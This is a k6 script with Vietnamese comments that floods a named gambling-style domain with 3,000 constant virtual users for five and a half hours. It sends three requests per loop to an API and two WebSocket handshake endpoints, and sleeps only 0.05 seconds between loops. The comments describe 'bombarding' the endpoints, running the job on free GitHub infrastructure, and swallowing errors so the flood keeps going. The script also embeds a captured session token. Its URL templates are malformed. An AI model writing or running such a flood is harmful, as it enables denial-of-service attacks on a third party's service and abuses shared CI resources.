import http from 'k6/http';
import { check, sleep } from 'k6';

export const options = {
  scenarios: {
    github_peak_flood: {
      executor: 'constant-vus',
      vus: 3000,                // Duy trì liên tục khóa cứng 3.000 người dùng ảo
      duration: '5h30m',        // Chạy tối đa 5 tiếng 30 phút để an toàn trên hạ tầng GitHub Free
    },
  },
};

// Chuỗi Token mới nhất lấy từ link Jackpot của bạn
const TOKEN = '05%2F7JlwSPGyw9zyLckWuhme1c4JqGT6pX1uSy1Ld66Ks0lsEnAmzaCPfHRaGMMhBj60RAomzqNVXQVdkJ%2FvGpaVowpSvKddd%2BBH0saRmaSfpII9yKGTouYzJkIX3r5OeMYWNimHnDfCophfzoCZZd634dab%2FvlFiVoMR3hDON8eKj8IAj3saw11dQOTZtiWa2pIyfnvizdXa3ZMpzjvZQZ4MZdYtJ5Kv%2FTR62yUfVNfAKuz6sPgOP7c6YndWVNK1nBOWGeV3QeGFde7BYqF4jjKnXMM%2BTde79%2FcNnVPSVQyOthFft6QiJOs75gGveb8oVN23gAVXLf%2B8WMun5ZmkQQ%3D%3D.79d5031f8b5c0a7602fef3a2fb61859e40f8aa46a81495dcfa50f8ebe04e280b';

export default function () {
  try {
    // 1. Dội bom yêu cầu vào HTTP API chính
    const res1 = http.get(`https://apiquadautayshelby.vip{TOKEN}`);
    check(res1, { 'API OK': (r) => r.status === 200 || r.status === 401 });

    // 2. Dội bom yêu cầu vào cổng bắt tay WebSocket mới
    const res2 = http.get(`https://apiquadautayshelby.vip{TOKEN}`);
    check(res2, { 'New Hub OK': (r) => r.status !== 0 });

    // 3. Dội bom yêu cầu vào cổng bắt tay WebSocket cũ
    const res3 = http.get(`https://apiquadautayshelby.vip{TOKEN}`);
    check(res3, { 'Old Hub OK': (r) => r.status !== 0 });
  } catch (err) {
    // Tự động nuốt lỗi mạng cục bộ để tiến trình k6 không bị dừng ngắt quãng
  }
  
  // Thời gian giãn cách siêu nhỏ (0.05 giây) nhằm đẩy tần suất request lên mức cao nhất
  sleep(0.05); 
}
